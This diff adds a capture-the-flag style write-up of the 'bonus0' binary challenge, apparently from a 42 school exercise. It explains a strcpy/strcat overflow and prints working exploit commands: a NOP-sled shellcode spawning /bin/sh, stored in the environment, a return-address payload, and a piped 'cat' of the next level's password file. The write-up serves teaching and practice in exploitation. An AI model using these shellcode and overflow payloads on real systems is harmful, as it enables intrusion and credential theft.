@@ -1,0 +1,42 @@
+-- Blackbox --
+When running the binary we notice it gets 2 input, if we provide 2 string 20 byte long it segv
+It seems as long as first string is 20 byte and second 17 it will segv. Lower first string and it never segv, and below 17 on the 2nd same
+
+-- Static analysis --
+No protection
+No interesting string
+3 functions
+main -> pp ; puts
+pp -> p; p; strcpy; strcat
+p -> puts; read; strchr; strncpy
+We roughly knew it would do those, nothing too surprising, lets recreate the .c to find the vuln precisely and how to exploit it
+
+-- Program flow --
+Store 2 s[20] read from stdin, then catenate them together in one buffer in main
+
+-- Vulnerability --
+When we write 20 or more into s1, the \n is not in the buffer, so there is no \0 since s2 is next to it in memory
+so strcpy will store both into buffer
+Then strcat will add s2 again
+So instead of a controlled 40byte max input, we can write 60 max in it
+
+-- Exploit --
+Lets figure out the offset to eip in our 2nd buffer 
+`ragg2 -P 50 -r` `((python -c "print 'A'*20"); (python -c "print 'AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQA'"); echo "cat /home/user/bonus1/.pass") | ./bonus0` `dmesg = 45414144` `r2 -; wopD` `wopO 0x45414144` = 9
+Lets store it in the env like usual since stack executable and no pic
+`export SHELLCODE=$(python -c "print '\x90'*512 + '\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff/bin/sh'")`
+Lets pick an address in the nopslide `0xbffff7cc` pack it and write it from 10 to 13
+Hm now it doesnt work, well the eip was found with a size 20 s2 60, if we give it less the eip will be further, so we need to add 7 padding after writing the address
+
+# mli @ student.42 syntax, he was a big help on this one, ty !
+`((python -c "print 'A'*20"); (python -c "print 'B'*9 + '\xcc\xf7\xff\xbf' + 'C'*7"); echo "cat /home/user/bonus1/.pass") | ./bonus0`
+
+-- trying to figure out why eip is here --
+and esp, ff0; sub esp, 0x40; buff = esp+0x1c
+`?vi 0x40 - 0x1c` = 42, 42-46 would be ebp and 46 to 50 would be eip
+if the stack is aligned it would be by 8, (as we see it is in gcc) so it would be from 54-58
+if eip if at 10 to 13 it means its at 20+20+10=50
+So thats weird, and it will stay unresolved.
+- We have eip at index 50-54
+- Without stack alignement it `should` be(?) at index 46-50
+- Wit stack alignement it `should` be(?) at index 54-58
